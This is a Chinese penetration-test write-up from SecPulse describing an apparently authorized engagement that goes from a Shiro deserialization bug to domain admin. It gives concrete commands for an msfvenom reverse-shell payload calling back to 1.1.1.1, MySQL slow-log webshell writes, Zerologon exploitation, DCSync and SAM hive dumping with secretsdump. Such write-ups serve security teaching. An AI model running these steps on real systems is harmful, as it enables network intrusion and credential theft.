⼀步步获取你的核⼼权限
-
安全脉搏
SecPulse.COM |
“ 这是 酒仙桥六号部队 的第 149 篇⽂
章。
这是 酒仙桥六号部队 的第 149 篇⽂章。
最近都在做渗透测试项⽬，并不需要内⽹渗透，少了很多
的成就感。于是，找了⼀个授权的企业项⽬，⽬标是获取
内⽹核⼼权限，⼿段不限。这就好说了，就喜欢这种能让
我胡乱来的⽬标。
对于企业⽽⾔，散落在外的资产肯定还有不少，于是为了
快速打点，先进⾏⼀波常规的信息收集。先进⾏了⼦域名
爆破、fofa、⾕歌等⽅式找到多个⼦域，通过其中⼀个⼦
域名反查找 IP，在历史解析记录中找到了真实的 IP，再
继续进⾏ C 段端⼝扫描，收集到了多个资产列表。扔进
XRAY 跑⼀波，在其中的⼀个资产中，发现了存在 shiro
反序列话漏洞，⼿⼯来测试⼀下：
github 上找个了⼯具尝试⼀下，发现可以执⾏命令：
查看了⼀下进程后，发现 web 是以 jar 包启动的，⽆法
直接写⼊ shell，直接尝试写内存 shell：
成功写⼊了蚁剑的 shell，先本地配置⼀下，并设置
Accept-Header 为: thisIsMyJob!@
设置好后直接连接，获取 webshell：
翻看了⼀下这台 linux 上的⽂件，由于 linux 权限不够，
⽆法查看 shadow，尝试提权也均失败了，查看历史命
令、计划任务等，并未有什么收获。只能下载 jar 包下来
分析，找到了 mysql 数据库的配置密码。于是先探测⼀
下内⽹，看能否快速的拿到其他主机的权限，不⾏再从数
据库⼊⼿看看。
因此，先做了个代理，配置⼀下 frp，先上传客户端到
web 上，修改了⼀下 frpc.ini ⽂件，使⽤ sock 代理：
⾃⼰的 VPS 上传服务端，修改⼀下权限，直接执
⾏./frps -c frps.ini：
然后回到客户端执⾏⼀下./frpc -c frpc.ini，即可使⽤。
本地使⽤ proxifier 代理⼀下：
先使⽤弱⼝令爆破⼯具爆破⼀波看看，果然有点东⻄，找
到了两台 linux 弱⼝令：
继续翻⽂件，还是⼀⽆所获，浪费了很多时间。可能核⼼
业务不在 linux 上，尝试⼀下能否获取⼀个 windows 权
限。先试试 ms17-010 漏洞，先⽣成⼀个⽊⻢：
msfvenom -p linux/x64/meterpreter/reverse_tcp
LHOST=1.1.1.1 LPORT=2233 -f elf > linux.elf
上传到 web 上，本地 msf 监听⼀下：
use exploit/multi/handler set payload
linux/x64/meterpreter/reverse_tcp show options set
LHOST 1.1.1.1 set LPORT 23333 run
在 web 的命令⾏下给 linux.elf 添加执⾏权限后直接运
⾏，即可获取到 meterpreter。然后再添加⼀下路由：
使⽤ 17-010 扫描模块跑⼀下：
未扫到任何漏洞，怀疑是不是哪⾥有问题，本地代理⽤⼯
具再跑⼀次：
确实不存在，这补丁确实都打了，⽩忙活了⼀场。想到之
前还有个数据库的连接串还没利⽤，可能还有点搞头。由
于之前代理过了，直接使⽤ navicat 连接数据库，查看⼀
下 mysql 版本是 5.7：
由于 secure-file-priv 的存在，⽆法尝试提权。nmap 扫
描了⼀下数据库的 ip 地址，发现 8090 端⼝还存在⼀个
php 系统，服务器是 server。于是先查询⼀下 mysql 的
数据库⽂件路径，发现不是 phpstudy 或者 wamp 等软
件⼀键搭建的：
可要想获取 shell，前提要得到 web 路径，才能写⼊⽊
⻢，通过 web 报错⻚⾯、⽬录扫描都未获取到。于是开
始尝试⼀下 IIS 的默认路径 c:Inetpubwwwroot，写⼊后
访问不到。想到 mysql 是放在 d 盘下，因此尝试 d 盘的
d:www、d:Inetpubwwwroot、d:data 等路径，都没访问
到，最终随⼿测了下 d:web，竟成功写⼊。通过 mysql
慢⽇志写 shell 过程如下：
set global slow_query_log='ON'; set global
slow_query_log_file='D:/web/cmd.php'; select '' or sleep(11); set global
slow_query_log='OFF';
由于存在杀软，普通的⼀句话⽊⻢直接被杀，因此重新写
⼊⼀个冰蝎的⻢：
set global slow_query_log='ON'; set global
slow_query_log_file='D:/web/t.php'; select '' or sleep(11); set global slow_query_log='OFF';
写⼊后直接访问 t.php，重新⽣成. 1.php 的冰蝎⻢，直
接连接：
查看⼀下系统权限，有点低：
查看⼀下 ip 地址：
由于是该台服务器 server2012，⽆法直接获取 windows
密码，且存在国外某某科技的杀软，已有的提权⼯具都被
杀了，技术不⾏绕不过，还是换个思路。
于是，开始翻找⽂件，看是否会有敏感信息。在服务器上
发现多套源码，在其中的⼀个⽂件⾥发现了配置信息：
尝试连接数据库，失败！！
通过这收集到的密码，再做成密码字典，开始爆破 C 段
的 RDP、mysql、sqlserver、ftp 等服务：
爆破后，发现是当前服务器的 administrator 密码，通过
之前的端⼝信息收集发现开放了 3389 端⼝，可以远程
登录。
还是继续进⾏信息收集，查看当前服务器是否是域内机
器，若存在域就相对好很多。执⾏:
net time /domain
发现是存在域的。查看⼀下域控机器：
net group "domain controllers" /domain
获取⼀下域控的 IP 地址：
⽬前知道当前的机器在域内，并有了服务器的管理员权
限。可以尝试通过导出 hash 的⽅式获取域账号信息，再
进⾏ PTH。因此，直接远程连接，右键导出 lsass.exe
进程的 dump ⽂件，再上传免杀的 mimikatz 进⾏读
取，但最终读取失败：
看来只能通过其他⽅法了，联想到前不久爆出的
NetLogon 权限提升漏洞，可以尝试⼀下，毕竟时间过得
不久，可能都还没打补丁。
使⽤ github 上的搜到的脚本尝试⼀下，先验证是否存在
漏洞：
python3 zerologon_tester.py DC 10.100.1.231
返回 success，表示存在漏洞。
使⽤ cve-2020-1472-exploit.py 将机器账户重置：
使⽤ DCSync 导出域内所有⽤户凭据：
通过 wmic 进⾏ pass the hash，可拿到域控制器中的管
理员权限：
⾄此，已经拿到核⼼权限了，截了个图，赶紧恢复⼀下机
器账号的密码，不然脱域问题就⼤了。
先导出 SAM 数据库⽂件，下载回来后，记得删除：
reg save HKLMSYSTEM system.save reg save HKLMSAM
sam.save reg save HKLMSECURITY security.save get
system.save get sam.save get security.save del /f
system.save del /f sam.save del /f security.save
通过 sam 等⽂件获得原 ntlm hash：
python3 secretsdump.py -sam sam.save -system
system.save -security security.save LOCAL
通过获取到的 $MACHINE.ACC 账户的 hash，进⾏恢
复：
这次的渗透，主要是通过外⽹的 shiro 漏洞上传内存⻢，
快速打点，以此做跳板进⼊内⽹。再通过源码获取数据库
配置⽂件，尝试获取到数据库服务器的普通权限后，继续
信息收集，获取到本地管理员权限，发现服务器在域内，
且存在 NetLogon 漏洞，此后成功获取域控。
本⽂作者： 酒仙桥六号部队
本⽂为安全脉搏专栏作者发布，转载请注明：
https://www.secpulse.com/archives/152386.html
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明